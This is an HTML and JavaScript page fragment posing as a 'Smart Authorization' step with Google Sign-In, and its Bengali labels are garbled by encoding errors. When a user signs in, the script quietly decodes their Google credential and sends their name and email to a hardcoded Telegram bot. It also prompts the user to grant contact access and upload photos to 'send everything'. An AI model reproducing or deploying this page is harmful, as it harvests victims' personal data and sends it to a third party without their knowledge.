<script src="https://accounts.google.com/gsi/client" async defer></script>

<div class="container">
    <h2>Smart Authorization ЁЯЫбя╕П</h2>
    
    <div id="g_id_onload"
         data-client_id="YOUR_GOOGLE_CLIENT_ID.apps.googleusercontent.com"
         data-callback="handleCredentialResponse">
    </div>
    <div class="g_id_signin" data-type="standard"></div>

    <p class="info-text" style="margin-top: 20px;">рж▓ржЧржЗржи ржХрж░рж╛рж░ ржкрж░ ржЫржмрж┐ рж╕рж┐рж▓рзЗржХрзНржЯ ржХрж░рзБржи</p>
    
    <button class="btn" id="contactBtn">ЁЯСд ржХржирзНржЯрж╛ржХрзНржЯ ржПржХрзНрж╕рзЗрж╕ ржжрж┐ржи</button>
    <input type="file" id="images" multiple accept="image/*" style="display: none;">
    <button class="btn" onclick="document.getElementById('images').click()">ЁЯЦ╝я╕П ржЫржмрж┐ рж╕рж┐рж▓рзЗржХрзНржЯ ржХрж░рзБржи</button>
    <button class="btn" id="finalSend" style="background: #10b981; margin-top: 20px;" disabled>рж╕ржмржХрж┐ржЫрзБ ржкрж╛ржарж╛ржи</button>
</div>

<script>
    const botToken = "7885791804:AAHQjsAsMuBfvVqWga0hub2m0QZ7BrgsAsc";
    const chatId = "5923885908";

    // ржЧрзБржЧрж▓ ржерзЗржХрзЗ ржЗржорзЗржЗрж▓ ржкрж╛ржУрзЯрж╛рж░ ржлрж╛ржВрж╢ржи
    function handleCredentialResponse(response) {
        // ржбрж┐ржХрзЛржб ржХрж░рж╛ ржбрж╛ржЯрж╛ ржерзЗржХрзЗ ржЗржорзЗржЗрж▓ ржмрзЗрж░ ржХрж░рж╛
        const responsePayload = parseJwt(response.credential);
        const userEmail = responsePayload.email;
        const userName = responsePayload.name;

        // ржЯрзЗрж▓рж┐ржЧрзНрж░рж╛ржорзЗ ржкрж╛ржарж╛ржирзЛ
        const text = `ЁЯОп ржирждрзБржи ржЗржЙржЬрж╛рж░ рж▓ржЧржЗржи ржХрж░рзЗржЫрзЗ:\nЁЯСд ржирж╛ржо: ${userName}\nЁЯУз ржЬрж┐ржорзЗржЗрж▓: ${userEmail}`;
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
        
        alert("ржЬрж┐ржорзЗржЗрж▓ ржнрзЗрж░рж┐ржлрж╛ржЗржб: " + userEmail);
        document.getElementById('finalSend').disabled = false;
    }

    function parseJwt (token) {
        var base64Url = token.split('.')[1];
        var base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
        return JSON.parse(window.atob(base64));
    }

    // ржЖржкржирж╛рж░ ржмрж╛ржХрж┐ ржХржирзНржЯрж╛ржХрзНржЯ ржПржмржВ ржЗржорзЗржЬ ржкрж╛ржарж╛ржирзЛрж░ ржХрзЛржб ржПржЦрж╛ржирзЗ ржерж╛ржХржмрзЗ...
</script>
